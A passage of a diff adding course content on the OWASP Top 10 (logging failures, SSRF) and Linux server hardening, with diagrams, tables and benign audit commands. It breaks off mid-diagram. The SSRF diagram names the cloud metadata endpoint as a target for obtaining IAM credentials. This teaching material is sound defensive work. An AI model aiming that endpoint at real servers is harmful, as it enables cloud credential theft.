+        <p>If a breach happens and there's no logging to detect it, the breach can continue undetected for months. The median real-world "time to detect a breach" across the industry has historically been measured in <em>months</em>, not hours, and insufficient logging/monitoring is a major reason why.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: The Monitoring Gap</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    The Monitoring Gap                           │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  No Monitoring                                           │   │
+    │  │                                                          │   │
+    │  │  Breach occurs                                          │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  No logging/monitoring                                  │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Months pass                                            │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ❌ Finally discovered by external party                │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  With Monitoring                                         │   │
+    │  │                                                          │   │
+    │  │  Breach occurs                                          │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Comprehensive logging + alerting                       │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Minutes/hours pass                                     │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Detected and contained quickly                      │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's8-a10-ssrf',
+      title: '8.7 A10: Server-Side Request Forgery (SSRF)',
+      priority: false,
+      icon: '🌐',
+      bodyHTML: `
+        <p>SSRF occurs when an application fetches a URL based on user-supplied input without validating it, allowing an attacker to make the <em>server itself</em> send requests to internal, otherwise-unreachable systems (e.g. cloud metadata endpoints, internal admin panels) that the attacker couldn't reach directly.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: SSRF Attack Flow</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    SSRF Attack Flow                             │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  The Attack                                               │   │
+    │  │                                                          │   │
+    │  │  Attacker sends request with user-supplied URL          │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Application fetches URL from server                    │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Server reaches internal endpoint:                      │   │
+    │  │  169.254.169.254/latest/meta-data/                      │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ❌ Attacker obtains cloud metadata (e.g., IAM creds)   │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Defence                                                 │   │
+    │  │                                                          │   │
+    │  │  Validate and allowlist allowed destinations            │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Block access to internal IP ranges                     │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Server cannot be used as proxy                      │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's8-pitfalls',
+      title: '8.8 Common Pitfalls (A04–A10 Summary)',
+      priority: false,
+      icon: '⚠️',
+      bodyHTML: `
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>Pitfall</th><th>Category</th><th>How to avoid</th></tr></thead>
+            <tbody>
+              <tr><td><strong>No threat modeling before building a sensitive feature</strong></td><td>A04</td><td>Explicitly ask "how could this be abused?" during design, not just "does it work?"</td></tr>
+              <tr><td><strong>Leaving cloud storage/databases at default public settings</strong></td><td>A05</td><td>Explicitly review and lock down every default configuration before production</td></tr>
+              <tr><td><strong>Running outdated dependencies without a patching process</strong></td><td>A06</td><td>Automated dependency scanning (Dependabot, Snyk) integrated into CI/CD</td></tr>
+              <tr><td><strong>No rate limiting on login attempts</strong></td><td>A07</td><td>Implement account lockout / exponential backoff after repeated failed attempts</td></tr>
+              <tr><td><strong>Trusting a package/update without verifying its signature</strong></td><td>A08</td><td>Verify checksums/signatures, use lockfiles pinning exact versions</td></tr>
+              <tr><td><strong>No alerting on suspicious activity</strong></td><td>A09</td><td>Centralized logging (e.g. ELK/Loki) with active alerting, not just passive log storage</td></tr>
+              <tr><td><strong>Fetching user-supplied URLs server-side without validation</strong></td><td>A10</td><td>Validate/allowlist destinations before the server makes any outbound request on a user's behalf</td></tr>
+              <tr><td><strong>No SBOM maintained for application</strong></td><td>A06/A08</td><td>Generate and maintain an SBOM for all dependencies</td></tr>
+              <tr><td><strong>No incident response plan</strong></td><td>A09</td><td>Have a plan for what to do when an alert fires</td></tr>
+            </tbody>
+          </table>
+        </div>
+      `
+    },
+    {
+      id: 's8-hands-on',
+      title: '8.9 Hands-On Practice (Codespace)',
+      priority: false,
+      icon: '🖥️',
+      bodyHTML: `
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0 0 0.25rem 0;">1. Check installed Python packages for known vulnerabilities</h4>
+        <div class="code-block">
+          <pre>
+    # Install pip-audit
+    pip install pip-audit --break-system-packages
+
+    # Scan your installed packages against vulnerability databases
+    pip-audit
+    # This scans your installed packages against a known-vulnerability database — exactly
+    # what A06 (vulnerable components) defends against in a real pipeline</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">2. Inspect a package's actual pinned version vs "latest"</h4>
+        <div class="code-block">
+          <pre>
+    # Show currently installed packages with exact versions
+    pip freeze | head -10
+
+    # Compare this to a requirements.txt without pinned versions:
+    # requests
+    # flask
+    # vs pinned:
+    # requests==2.28.2
+    # flask==2.2.3
+    # "latest" dependencies could silently change between builds without anyone noticing</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">3. Simulate checking a file's integrity before "trusting" it</h4>
+        <div class="code-block">
+          <pre>
+    # Create a legitimate update
+    echo "legitimate update content" > update.sh
+
+    # Generate a checksum (the "published hash")
+    sha256sum update.sh > update.sh.sha256
+    cat update.sh.sha256
+
+    # In a real pipeline, this hash would be compared against a signed, published value
+    # before the update is ever executed — never trust an update blindly</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">4. Search for verbose error handling patterns (A05 hygiene check)</h4>
+        <div class="code-block">
+          <pre>
+    # Check for DEBUG-level logging or debug mode flags
+    grep -rn "DEBUG" . 2>/dev/null | head -5
+    grep -rn "debug=True" . 2>/dev/null | head -5
+
+    # Production systems should never run with debug mode enabled — it commonly
+    # exposes stack traces and internal paths directly to end users</pre>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">5. Generate a simple SBOM (Software Bill of Materials)</h4>
+        <div class="code-block">
+          <pre>
+    # For Python projects, pip freeze is a simple SBOM
+    pip freeze > requirements.txt.sbom
+    cat requirements.txt.sbom
+
+    # More comprehensive tools exist (CycloneDX, SPDX) but this is the concept</pre>
+        </div>
+      `
+    },
+    {
+      id: 's8-devops-connection',
+      title: '8.10 DevOps Connection',
+      priority: false,
+      icon: '⚙️',
+      bodyHTML: `
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>DevOps context</th><th>Where this OWASP category appears</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Dependabot / Snyk / pip-audit in CI/CD</strong></td><td>Directly defends against A06 by flagging known-vulnerable dependencies automatically</td></tr>
+              <tr><td><strong>Infrastructure as Code scanning (tfsec, Checkov)</strong></td><td>Catches A05-style misconfigurations (public buckets, open security groups) before they're ever deployed</td></tr>
+              <tr><td><strong>Signed container images (Cosign/Sigstore)</strong></td><td>Directly defends against A08-style supply chain attacks by verifying image provenance before deployment</td></tr>
+              <tr><td><strong>Centralized logging stacks (ELK, Loki) + alerting (Prometheus/Grafana)</strong></td><td>The concrete infrastructure answer to A09 — Phase 2's Monitoring pillar covers this in full</td></tr>
+              <tr><td><strong>Rate limiting at the API gateway / ingress level</strong></td><td>An infrastructure-level defense against A07's brute-force login pattern, enforced before requests even reach the application</td></tr>
+              <tr><td><strong>SLSA framework (Supply-chain Levels for Software Artifacts)</strong></td><td>An industry framework specifically formalizing defenses against A08-style build pipeline compromise, post-SolarWinds</td></tr>
+              <tr><td><strong>SBOM generation in CI/CD</strong></td><td>Tools like Syft, CycloneDX generate SBOMs during builds for vulnerability tracking</td></tr>
+              <tr><td><strong>Threat modeling tools (e.g., OWASP Threat Dragon)</strong></td><td>Formalizing A04's threat modeling process with structured tools</td></tr>
+            </tbody>
+          </table>
+        </div>
+      `
+    },
+    {
+      id: 's8-key-takeaways',
+      title: 'Key Takeaways — OWASP Top 10 Part 2',
+      priority: false,
+      icon: '🧠',
+      bodyHTML: `
+        <div class="mental-model-grid">
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🏗️</span><span class="mental-title">A04: Insecure Design</span></div>
+            <div class="mental-card-body">Architecture-level flaw, not a coding bug. <strong>Threat modeling</strong> before building matters as much as secure coding afterward.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">⚙️</span><span class="mental-title">A05: Misconfiguration</span></div>
+            <div class="mental-card-body">High-volume in real audits because it's tedious, not sophisticated. <strong>Check every default setting.</strong></div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">📦</span><span class="mental-title">A06: Vulnerable Components</span></div>
+            <div class="mental-card-body">Your application inherits every flaw in every dependency. <strong>Log4Shell</strong> showed how deeply this propagates.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🔑</span><span class="mental-title">A07: Authentication Failures</span></div>
+            <div class="mental-card-body">Weak passwords, no rate limiting, exposed session IDs. <strong>Rate limiting</strong> and <strong>account lockout</strong> are essential.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🔗</span><span class="mental-title">A08: Integrity Failures</span></div>
+            <div class="mental-card-body">Misplaced trust — <strong>SolarWinds</strong> showed signed updates can still be malicious. Verify signatures, use lockfiles.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">📊</span><span class="mental-title">A09: Monitoring Failures</span></div>
+            <div class="mental-card-body">No logging = breach undetected for months. <strong>Centralized logging + active alerting</strong> is essential.</div>
+          </div>
+          <div class="mental-card">
+            <div class="mental-card-header"><span class="mental-icon">🌐</span><span class="mental-title">A10: SSRF</span></div>
+            <div class="mental-card-body">Server becomes an attacker's proxy. <strong>Validate and allowlist</strong> destinations before fetching URLs.</div>
+          </div>
+          <div class="mental-card mental-card-full">
+            <div class="mental-card-header"><span class="mental-icon">📋</span><span class="mental-title">SBOM — Know Your Dependencies</span></div>
+            <div class="mental-card-body">Maintain a <strong>Software Bill of Materials</strong> for every application. Know what's in your code, track vulnerabilities, verify integrity.</div>
+          </div>
+        </div>
+      `
+    }
+  ]; 
+
+  const SECTION_9_ACCORDIONS = [
+    {
+      id: 's9-hardening',
+      title: '9.1 What "Hardening" Means, With a Concrete Scenario',
+      priority: false,
+      icon: '🛡️',
+      bodyHTML: `
+        <p>Say you spin up a brand-new Ubuntu server for a side project. Fresh out of the box, it likely has: a handful of unnecessary services running, a root account reachable via SSH with password authentication enabled, default configurations that prioritize ease of use over security, and no firewall actively restricting incoming connections. Within minutes of that server getting a public IP address, automated bots across the internet are already scanning it — this isn't paranoia, it's measurable: honeypot research consistently shows a fresh public IP gets its first unsolicited connection attempt within <em>seconds to minutes</em>, not days.</p>
+        <p><strong>Hardening</strong> is the deliberate, systematic process of reducing a system's <strong>attack surface</strong> — the total set of points where an attacker could possibly get in — by disabling what isn't needed, restricting what remains, and configuring defenses actively rather than relying on defaults.</p>
+        <div class="info-box warning"><strong>💡 A crucial note upfront:</strong> port scanning is not the only threat model here. <strong>Phishing</strong> — tricking a legitimate user into handing over credentials or running malicious code — bypasses every network-level hardening measure in this section entirely, because it targets the human, not the machine. Hardening reduces the <em>technical</em> attack surface; it doesn't replace user security awareness. Both matter, but this section focuses specifically on the systems side.</div>
+      `
+    },
+    {
+      id: 's9-firewalls',
+      title: '9.2 Firewalls, Revisited Through a Security Lens',
+      priority: false,
+      icon: '🔥',
+      bodyHTML: `
+        <p>Section 1 of the Networking pillar covered firewalls at a functional level — stateful vs stateless, ACL rule evaluation. Here, the lens shifts to <em>policy design</em>.</p>
+        <p><strong>Default-deny is the foundational hardening principle:</strong> block everything by default, then explicitly allow only what's specifically needed. The opposite approach — default-allow, block known-bad things — is fundamentally weaker, because it requires anticipating every possible bad thing in advance, which is impossible. Default-deny only requires knowing what you <em>do</em> need, which is a much smaller, more knowable list.</p>
+        <p><strong>Concrete example:</strong> a web server genuinely needs inbound port 443 (HTTPS) open, and maybe port 22 (SSH) restricted to a specific known IP range for administration. Every other port — including whatever the server happened to have running by default — should be closed. If a misconfigured service accidentally starts listening on port 8080, default-deny means it's still unreachable from the internet regardless, because the firewall never explicitly allowed that port through in the first place.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Default-Deny vs Default-Allow</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                Default-Deny vs Default-Allow                   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Default-Deny (Hardened)                                 │   │
+    │  │                                                          │   │
+    │  │  Incoming connection, any port                          │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ┌───────────────────────────────────────┐              │   │
+    │  │  │  Explicitly allowed?                   │              │   │
+    │  │  └───────────────────────────────────────┘              │   │
+    │  │         │                     │                          │   │
+    │  │        No                     Yes                        │   │
+    │  │         │                     │                          │   │
+    │  │         ▼                     ▼                          │   │
+    │  │  Blocked automatically    Allowed through               │   │
+    │  │                           (port 443, 22 from known IP)  │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Default-Allow (Weak)                                   │   │
+    │  │                                                          │   │
+    │  │  Incoming connection, any port                          │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ┌───────────────────────────────────────┐              │   │
+    │  │  │  Explicitly blocked?                   │              │   │
+    │  │  └───────────────────────────────────────┘              │   │
+    │  │         │                     │                          │   │
+    │  │        Yes                   No                         │   │
+    │  │         │                     │                          │   │
+    │  │         ▼                     ▼                          │   │
+    │  │     Blocked            Allowed through by accident      │   │
+    │  │                           (nobody thought to block)     │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's9-attack-surface',
+      title: '9.3 Reducing Attack Surface — Beyond the Firewall',
+      priority: false,
+      icon: '🎯',
+      bodyHTML: `
+        <p>Hardening extends well past network rules into the system itself:</p>
+        <ul style="padding-left:1.2rem;margin:0.5rem 0;">
+          <li><strong>Disable unused services</strong> — if a server doesn't need FTP, a mail server, or a database server running locally, those services shouldn't even be installed, let alone running. Every running service is a potential vulnerability waiting to be discovered.</li>
+          <li><strong>Remove default accounts and credentials</strong> — many appliances and software ship with a well-known default admin account. Attackers maintain lists of exactly these defaults and try them automatically against every reachable device.</li>
+          <li><strong>Disable root SSH login, require key-based authentication</strong> — password-based SSH is subject to brute-forcing; key-based authentication is effectively immune to brute-forcing since there's no password to guess.</li>
+          <li><strong>Keep the system patched</strong> — directly connects back to Section 8's A06 (vulnerable/outdated components).</li>
+          <li><strong>Principle of least privilege at the OS level</strong> — services should run as unprivileged, dedicated users rather than root.</li>
+        </ul>
+      `
+    },
+    {
+      id: 's9-port-hygiene',
+      title: '9.4 Port Hygiene',
+      priority: false,
+      icon: '🔌',
+      bodyHTML: `
+        <p>A <strong>port scan</strong> is one of the very first things an attacker does against any target — systematically checking which ports respond, to map out what's running and potentially exploitable.</p>
+        <p><strong>Concrete scenario:</strong> running <code>nmap</code> against a server reveals port 22 (SSH, expected), port 443 (HTTPS, expected) — but also port 3306 (MySQL) unexpectedly open to the entire internet. That database was likely never meant to be publicly reachable; it's just that nobody explicitly closed it.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Reducing Attack Surface, Layer by Layer</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    Reducing Attack Surface, Layer by Layer      │
+    │                                                                 │
+    │    Fresh, unhardened server                                   │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    1. Firewall: default-deny, allow only needed ports         │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    2. Disable unused services                                 │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    3. Remove default credentials, disable password SSH        │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    4. Patch OS and all software regularly                     │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    5. Run services as unprivileged users,                     │
+    │       apply systemd + kernel hardening                       │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    6. Add MAC (AppArmor/SELinux), auditd, fail2ban           │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    ✅ Hardened server: minimal attack surface, monitored       │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's9-cis-benchmarks',
+      title: '9.5 CIS Benchmarks — What They Are and Why They Matter',
+      priority: false,
+      icon: '📋',
+      bodyHTML: `
+        <p>Everything covered so far (default-deny, disabling services, key-based SSH) is <em>correct</em> advice, but in practice, nobody wants to invent a hardening checklist from scratch for every OS, database, and cloud platform they touch. This is exactly the gap <strong>CIS Benchmarks</strong> fill.</p>
+        <p><strong>CIS (Center for Internet Security)</strong> is a nonprofit that publishes detailed, consensus-driven hardening guides — specific, numbered, testable configuration recommendations for a huge range of systems: Ubuntu, Windows Server, Docker, Kubernetes, AWS, and dozens more. Each benchmark item typically includes: the exact setting to check, why it matters, the exact command to verify current state, and the exact command to remediate it.</p>
+        <p><strong>Why this matters practically:</strong> rather than a security engineer manually reasoning through "should SSH root login be disabled? Probably?" for every single server, CIS Benchmarks provide an already-vetted, numbered answer — "Ensure permit root login is disabled (CIS Benchmark 5.2.8)" — with the exact config file and setting to check.</p>
+        <p>CIS Benchmarks typically define two "levels": <strong>Level 1</strong> (safe for nearly any environment, minimal functional impact) and <strong>Level 2</strong> (more restrictive, may affect functionality, intended for higher-security environments).</p>
+      `
+    },
+    {
+      id: 's9-systemd-hardening',
+      title: '9.6 Systemd Service Hardening',
+      priority: false,
+      icon: '⚙️',
+      bodyHTML: `
+        <p>Most modern Linux distributions run services under <strong>systemd</strong>. Systemd includes a set of hardening directives that can be applied <em>per service</em>, sandboxing what that specific service is allowed to do at the OS level.</p>
+        <div class="table-wrapper">
+          <table class="data-table">
+            <thead><tr><th>Directive</th><th>What it does</th><th>Why it matters</th></tr></thead>
+            <tbody>
+              <tr><td><code>ProtectSystem=strict</code></td><td>Mounts the entire filesystem read-only for the service</td><td>Even if the service is compromised, the attacker can't modify system files</td></tr>
+              <tr><td><code>PrivateTmp=true</code></td><td>Gives the service its own isolated <code>/tmp</code> directory</td><td>Prevents symlink attacks and insecure temp file races</td></tr>
+              <tr><td><code>NoNewPrivileges=true</code></td><td>Prevents the service from gaining more privileges</td><td>Blocks privilege escalation attempts</td></tr>
+              <tr><td><code>ProtectHome=true</code></td><td>Makes user home directories inaccessible</td><td>Limits what a compromised service can read/exfiltrate</td></tr>
+              <tr><td><code>PrivateNetwork=true</code></td><td>Gives the service its own isolated network namespace</td><td>Useful for services with no legitimate outbound network needs</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Systemd Service Hardening in Context</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                Systemd Service Hardening in Context             │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Systemd Unit File                                       │   │
+    │  │                                                          │   │
+    │  │  [Service]                                              │   │
+    │  │  ExecStart=/usr/bin/my-api                              │   │
+    │  │  ProtectSystem=strict  ──────┐                         │   │
+    │  │  PrivateTmp=true             │                         │   │
+    │  │  NoNewPrivileges=true        ├──► Sandboxed service    │   │
+    │  │  ProtectHome=true            │                         │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                              │                                  │
+    │                              ▼                                  │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Effects                                                 │   │
+    │  │                                                          │   │
+    │  │  ProtectSystem=strict    → Filesystem: read-only        │   │
+    │  │  PrivateTmp=true         → /tmp: isolated              │   │
+    │  │  NoNewPrivileges=true    → Cannot escalate privileges   │   │
+    │  │  ProtectHome=true        → Cannot read /home/*         │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+        <p><strong>Concrete example:</strong> even if <code>my-api</code> has an unpatched remote code execution vulnerability, these directives mean an attacker who gains code execution inside that service still can't modify system files, escalate privileges, or read other users' home directories — the OS itself enforces these boundaries regardless of what the compromised application tries to do.</p>
+      `
+    },
+    {
+      id: 's9-kernel-hardening',
+      title: '9.7 Kernel Hardening',
+      priority: false,
+      icon: '🧠',
+      bodyHTML: `
+        <p>Some hardening happens below even the service level, at the Linux kernel itself.</p>
+        <ul style="padding-left:1.2rem;margin:0.5rem 0;">
+          <li><strong>ASLR (Address Space Layout Randomization):</strong> randomizes where a program's code and data are loaded into memory each time it runs. Many classic memory-corruption exploits rely on knowing exact memory addresses; ASLR makes those addresses unpredictable.</li>
+          <li><strong>NX bit (No-eXecute):</strong> marks memory regions used for data as non-executable. A classic buffer-overflow attack injects code into a data region; the NX bit makes that technique fail outright.</li>
+          <li><strong>sysctl hardening:</strong> the Linux kernel exposes hundreds of tunable parameters via <code>sysctl</code>. Examples: <code>net.ipv4.conf.all.rp_filter=1</code> (enables reverse path filtering), <code>kernel.dmesg_restrict=1</code> (prevents unprivileged users from reading kernel logs).</li>
+        </ul>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Kernel Hardening in Action</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    Kernel Hardening in Action                  │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  Without Kernel Hardening                                │   │
+    │  │                                                          │   │
+    │  │  Attacker injects malicious code                       │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Code executed in memory                                │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ❌ Attacker gains control                              │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  With ASLR + NX                                          │   │
+    │  │                                                          │   │
+    │  │  Attacker injects malicious code                       │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Memory addresses are randomized (ASLR)                 │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  Data regions are non-executable (NX)                   │   │
+    │  │         │                                                │   │
+    │  │         ▼                                                │   │
+    │  │  ✅ Attack fails                                        │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+      `
+    },
+    {
+      id: 's9-fail2ban',
+      title: '9.8 Fail2ban — A Practical SSH Defence',
+      priority: false,
+      icon: '🚫',
+      bodyHTML: `
+        <p>Key-based SSH authentication already defeats brute-force password guessing. But if password authentication must remain enabled, or simply as a defence-in-depth layer, <strong>fail2ban</strong> provides an important practical safeguard.</p>
+        <p><strong>How it works:</strong> fail2ban monitors log files for patterns matching failed login attempts. After a configurable number of failures from the same source IP, it automatically adds a temporary firewall rule blocking that IP entirely.</p>
+        <p><strong>Concrete example:</strong> default fail2ban SSH configuration might allow 5 failed attempts within 10 minutes before banning the source IP for an hour. A brute-force bot trying thousands of password guesses gets shut down after its 6th attempt.</p>
+      `
+    },
+    {
+      id: 's9-auditd',
+      title: '9.9 Auditd — Logging What Actually Happens on the System',
+      priority: false,
+      icon: '📝',
+      bodyHTML: `
+        <p>Section 8's A09 covered <em>why</em> logging matters. <strong>auditd</strong> is the Linux kernel's own auditing subsystem, operating at an OS-wide level — it can log specific system calls, file access attempts, and command executions across the entire system.</p>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: Auditd Event Flow</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    Auditd Event Flow                            │
+    │                                                                 │
+    │    Process attempts action                                    │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    Kernel audit subsystem                                     │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    ┌─────────────────────────────────────────────┐             │
+    │    │  Matches auditd rules?                      │             │
+    │    └─────────────────────────────────────────────┘             │
+    │           │                     │                               │
+    │          Yes                   No                              │
+    │           │                     │                               │
+    │           ▼                     ▼                               │
+    │    Event logged to           Action proceeds                   │
+    │    /var/log/audit/audit.log  without logging                  │
+    │           │                                                     │
+    │           ▼                                                     │
+    │    Security team reviews/investigates                         │
+    └─────────────────────────────────────────────────────────────────┘
+            </code>
+          </pre>
+        </div>
+        <p><strong>Concrete example:</strong> an auditd rule can be configured to log every read or write attempt against <code>/etc/shadow</code> — including exactly which process and user attempted it, and whether it succeeded. If an unauthorized process ever attempts to read that file, there's a permanent, tamper-evident record for incident response.</p>
+      `
+    },
+    {
+      id: 's9-mac',
+      title: '9.10 Mandatory Access Control — AppArmor / SELinux',
+      priority: false,
+      icon: '🔒',
+      bodyHTML: `
+        <p>Everything covered in the Linux pillar's permissions section is <strong>Discretionary Access Control (DAC)</strong> — the resource owner decides who gets access. <strong>Mandatory Access Control (MAC)</strong> is a fundamentally different, additional layer: a system-wide security policy that constrains <em>even the resource owner and root</em> from actions outside the policy.</p>
+        <ul style="padding-left:1.2rem;margin:0.5rem 0;">
+          <li><strong>AppArmor</strong> (default on Ubuntu): confines individual programs to a defined profile — a specific list of files, capabilities, and network access that program is allowed to use.</li>
+          <li><strong>SELinux</strong> (default on Red Hat/CentOS/Fedora): a more granular, label-based MAC system where every process and file gets a security label, and policy rules define exactly which labels can interact.</li>
+        </ul>
+        <h4 style="font-size:0.95rem;font-weight:600;margin:0.75rem 0 0.25rem 0;">Visual: DAC vs MAC</h4>
+        <div class="code-block" style="background:transparent;border:none;padding:0;margin:0.5rem 0;">
+          <pre style="color:var(--text-primary);font-size:0.7rem;white-space:pre-wrap;word-break:break-all;background:var(--bg-tertiary);padding:1rem;border-radius:var(--radius-md);">
+            <code>
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                    DAC vs MAC                                   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
+    │  │  DAC (Discretionary Access Control)                      │   │
+    │  │                                                          │   │
+    │  │  ┌─────────────────────────────────────────────────┐    │   │
+    │  │  │  File owner                                    │    │   │
+    │  │  └────────────────────┬────────────────────────────┘    │   │
+    │  │                       │                                  │   │
+    │  │                       ▼                                  │   │
+    │  │  ┌─────────────────────────────────────────────────┐    │   │
+    │  │  │  can grant/revoke access                       │    │   │
+    │  │  └────────────────────┬────────────────────────────┘    │   │
+    │  │                       │                                  │   │
+    │  │                       ▼                                  │   │
+    │  │  ┌─────────────────────────────────────────────────┐    │   │
+    │  │  │  Any user, including root, can change these    │    │   │
+    │  │  │  permissions                                   │    │   │
+    │  │  └─────────────────────────────────────────────────┘    │   │
+    │  └─────────────────────────────────────────────────────────┘   │
+    │                                                                 │
+    │  ┌─────────────────────────────────────────────────────────┐   │
